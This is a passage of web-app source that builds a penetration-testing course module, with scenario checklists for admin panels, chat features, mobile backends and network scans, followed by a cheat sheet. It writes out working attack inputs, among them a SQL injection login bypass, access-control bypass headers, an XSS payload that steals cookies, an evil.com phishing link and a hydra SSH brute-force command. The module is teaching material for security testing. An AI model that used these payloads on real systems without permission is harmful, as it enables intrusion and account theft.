    <p><em>"During directory brute-forcing, you found /admin. Now what?"</em></p>

    <h3>Testing Approach</h3>
    <ol>
      <li><strong>Access without authentication</strong> — Navigate to /admin directly. If accessible → Critical broken access control!</li>
      <li><strong>Default credentials</strong> — Try admin/admin, admin/password, admin/123456, administrator/administrator</li>
      <li><strong>Brute force</strong> — If no rate limiting, use Burp Intruder with password list</li>
      <li><strong>SQL Injection</strong> — Try <code>admin' OR 1=1--</code> on admin login form</li>
      <li><strong>Access as normal user</strong> — Login as regular user, then navigate to /admin. If accessible → Vertical privilege escalation!</li>
      <li><strong>Parameter manipulation</strong> — Check if there's a cookie/parameter like <code>isAdmin=false</code>. Change to <code>isAdmin=true</code></li>
      <li><strong>JWT role manipulation</strong> — If JWT auth, decode token and change <code>"role":"user"</code> to <code>"role":"admin"</code></li>
      <li><strong>Forced browsing</strong> — Try /admin/users, /admin/settings, /admin/logs even without admin login</li>
      <li><strong>HTTP method tampering</strong> — If GET to /admin returns 403, try POST, PUT, or use <code>X-Original-URL: /admin</code> header</li>
    </ol>

    ${terminal('Admin Panel Bypass Techniques', `<span class="comment"># Method 1: Header-based bypass</span>
<span class="warning">X-Original-URL: /admin</span>
<span class="warning">X-Forwarded-For: 127.0.0.1</span>     <span class="comment"># Pretend to be localhost</span>
<span class="warning">X-Custom-IP-Authorization: 127.0.0.1</span>

<span class="comment"># Method 2: URL tricks</span>
<span class="warning">/admin → /Admin → /ADMIN → /admin/</span>
<span class="warning">/admin → /admin%20 → /admin%09</span>
<span class="warning">/admin → /./admin → /admin;/</span>

<span class="comment"># Method 3: HTTP method change</span>
<span class="warning">GET /admin → 403</span>
<span class="warning">POST /admin → 200</span>  <span class="comment"># Some servers only check GET</span>`)}
  </div>

  <!-- SCENARIO 8: WEBSOCKET/CHAT -->
  <div class="topic-section">
    <h2><span class="section-icon">💬</span> Scenario 8: Test a Real-Time Chat / Comment Feature</h2>
    <p><em>"The app has a chat feature or a comments section. Test it."</em></p>

    <table class="comparison-table">
      <tr><th>Test</th><th>Attack</th><th>Impact</th></tr>
      <tr><td><strong>Stored XSS</strong></td><td>Post message with <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td><td>Every user who sees the message gets their cookies stolen</td></tr>
      <tr><td><strong>HTML Injection</strong></td><td>Post <code>&lt;h1&gt;HACKED&lt;/h1&gt;</code> or <code>&lt;a href="evil.com"&gt;Click here&lt;/a&gt;</code></td><td>Phishing within the app, defacement</td></tr>
      <tr><td><strong>Markdown Injection</strong></td><td>If markdown is supported: <code>[Click](javascript:alert(1))</code></td><td>XSS through markdown links</td></tr>
      <tr><td><strong>IDOR on Messages</strong></td><td>Change message_id or chat_id to read other conversations</td><td>Read private messages</td></tr>
      <tr><td><strong>Message Deletion</strong></td><td>Can you delete other users' messages by changing message_id?</td><td>Broken access control</td></tr>
      <tr><td><strong>Message Editing</strong></td><td>Can you edit other users' messages?</td><td>Tampering, framing users</td></tr>
      <tr><td><strong>Rate Limiting</strong></td><td>Send 1000 messages per second</td><td>Spam, DoS on other users</td></tr>
      <tr><td><strong>File Sharing</strong></td><td>If file sharing enabled, upload malicious files</td><td>Malware distribution, web shell</td></tr>
    </table>
  </div>

  <!-- SCENARIO 9: MOBILE APP API -->
  <div class="topic-section">
    <h2><span class="section-icon">📱</span> Scenario 9: Pentest a Mobile Application's Backend API</h2>
    <p><em>"Test the mobile app's backend API endpoints."</em></p>

    <h3>Approach</h3>
    <ol>
      <li><strong>Set up proxy</strong> — Configure mobile device to use Burp as proxy. Install Burp CA certificate on device for HTTPS interception.</li>
      <li><strong>SSL Pinning Bypass</strong> — If app has SSL pinning, use Frida/Objection to bypass it: <code>objection -g com.app.name explore --startup-command "android sslpinning disable"</code></li>
      <li><strong>Capture all API traffic</strong> — Use the app normally while Burp captures all API calls</li>
      <li><strong>Decompile APK</strong> — Use <code>apktool d app.apk</code> to decompile. Search for hardcoded API keys, secrets, endpoints</li>
      <li><strong>Test all captured endpoints</strong> — Apply same API testing as Scenario 2 (IDOR, injection, auth bypass)</li>
      <li><strong>Check local storage</strong> — Are credentials, tokens, or sensitive data stored in plaintext? Check SharedPreferences, SQLite DBs, files</li>
      <li><strong>Check logging</strong> — Does the app log sensitive data? Run <code>adb logcat</code> while using the app</li>
      <li><strong>Deep link testing</strong> — Can custom URL schemes be exploited for phishing or unauthorized actions?</li>
    </ol>

    ${terminal('Mobile App Testing Commands', `<span class="comment"># Decompile APK</span>
<span class="cmd">apktool d target.apk</span>

<span class="comment"># Search for secrets in decompiled code</span>
<span class="cmd">grep -r "api_key\\|password\\|secret\\|token" ./target/</span>

<span class="comment"># Check for hardcoded URLs</span>
<span class="cmd">grep -r "http://\\|https://" ./target/smali/</span>

<span class="comment"># Bypass SSL Pinning with Frida</span>
<span class="cmd">frida -U -f com.app.name -l ssl_bypass.js</span>

<span class="comment"># Check local storage</span>
<span class="cmd">adb shell cat /data/data/com.app.name/shared_prefs/*.xml</span>

<span class="comment"># Monitor logs</span>
<span class="cmd">adb logcat | grep -i "password\\|token\\|key"</span>`)}
  </div>

  <!-- SCENARIO 10: NETWORK/INFRASTRUCTURE -->
  <div class="topic-section">
    <h2><span class="section-icon">🖧</span> Scenario 10: Network Infrastructure Assessment</h2>
    <p><em>"Here is a /24 subnet. Find vulnerabilities."</em></p>

    ${terminal('Network Assessment Steps', `<span class="comment"># STEP 1: Host Discovery</span>
<span class="cmd">nmap -sn 192.168.1.0/24</span>
<span class="comment"># Find all live hosts on the network</span>

<span class="comment"># STEP 2: Port Scanning on discovered hosts</span>
<span class="cmd">nmap -sV -O -p- 192.168.1.10</span>
<span class="comment"># All ports, service versions, OS detection</span>

<span class="comment"># STEP 3: Vulnerability Scanning</span>
<span class="cmd">nmap --script vuln 192.168.1.10</span>

<span class="comment"># STEP 4: Check for dangerous open services</span>
<span class="comment"># Port 21 (FTP) — Anonymous login? ftp 192.168.1.10 (user: anonymous)</span>
<span class="comment"># Port 22 (SSH) — Weak password? hydra -l root -P wordlist.txt ssh://192.168.1.10</span>
<span class="comment"># Port 23 (Telnet) — Plaintext! Should not be open</span>
<span class="comment"># Port 445 (SMB) — EternalBlue? smbclient -L 192.168.1.10</span>
<span class="comment"># Port 3306 (MySQL) — Remote access enabled? mysql -h 192.168.1.10 -u root</span>
<span class="comment"># Port 3389 (RDP) — Brute force? BlueKeep vulnerability?</span>

<span class="comment"># STEP 5: Check for default credentials on web services</span>
<span class="comment"># Any web servers on 80/443/8080/8443?</span>
<span class="comment"># Router admin panels? (192.168.1.1 → admin/admin)</span>
<span class="comment"># Printer web interfaces?</span>

<span class="comment"># STEP 6: Check for unencrypted services</span>
<span class="comment"># FTP instead of SFTP</span>
<span class="comment"># Telnet instead of SSH</span>
<span class="comment"># HTTP instead of HTTPS</span>`)}
  </div>

  <!-- SUMMARY TABLE -->
  <div class="topic-section">
    <h2><span class="section-icon">📋</span> Master Cheat Sheet — All Scenarios</h2>
    <table class="comparison-table">
      <tr><th>Scenario</th><th>Top 3 Things to Test</th></tr>
      <tr><td><strong>Login Page</strong></td><td>SQLi, Brute Force, Username Enumeration</td></tr>
      <tr><td><strong>E-Commerce</strong></td><td>Price Manipulation, Coupon Race Condition, IDOR on Orders</td></tr>
      <tr><td><strong>REST API</strong></td><td>IDOR, JWT Manipulation, Mass Assignment</td></tr>
      <tr><td><strong>File Upload</strong></td><td>Web Shell Upload, Extension Bypass, SVG XXE</td></tr>
      <tr><td><strong>Forgot Password</strong></td><td>Host Header Injection, Token Predictability, User Enumeration</td></tr>
      <tr><td><strong>Payment</strong></td><td>Price Tampering, Workflow Bypass, Replay Attack</td></tr>
      <tr><td><strong>Registration</strong></td><td>Mass Assignment, XSS in Name, OTP Bypass</td></tr>
      <tr><td><strong>Admin Panel</strong></td><td>Default Creds, Forced Browsing, Role Manipulation</td></tr>
      <tr><td><strong>Chat/Comments</strong></td><td>Stored XSS, IDOR on Messages, Rate Limiting</td></tr>
      <tr><td><strong>Mobile App</strong></td><td>SSL Pinning Bypass, Hardcoded Secrets, Insecure Storage</td></tr>
      <tr><td><strong>Network</strong></td><td>Open Ports, Default Creds, Unencrypted Services</td></tr>
    </table>
  </div>

  ${keyPoints([
    'For ANY scenario, follow: Recon → Map → Auth → AuthZ → Input → Logic → Session → Report',
    'Business logic bugs are what separate good testers from great ones — scanners miss these',
    'Always test with Burp Suite as proxy — intercept and modify EVERY request',
    'IDOR is in almost every scenario — always try changing IDs, user_ids, order_ids',
    'Price/quantity manipulation is critical for e-commerce and payment scenarios',
    'Host Header Injection on forgot password = account takeover',
    'File upload: try shell → extension bypass → content-type bypass → magic bytes',
    'For API: test without auth, with expired token, with other user token',
    'Always report: Description, Severity, Impact, Steps to Reproduce, Evidence, Remediation'
  ])}

  ${practiceBox([
    { text: 'DVWA — Practice all scenarios in controlled environment', url: 'https://github.com/digininja/DVWA' },
    { text: 'PortSwigger Labs — Free hands-on practice', url: 'https://portswigger.net/web-security/all-labs' },
    { text: 'OWASP Juice Shop — Modern realistic vulnerable app', url: 'https://owasp.org/www-project-juice-shop/' },
    { text: 'bWAPP — Buggy web application for practice', url: 'http://www.itsecgames.com/' }
  ])}

  ${moduleFooter('mod_scenarios', 'mod9', null)}`;
}

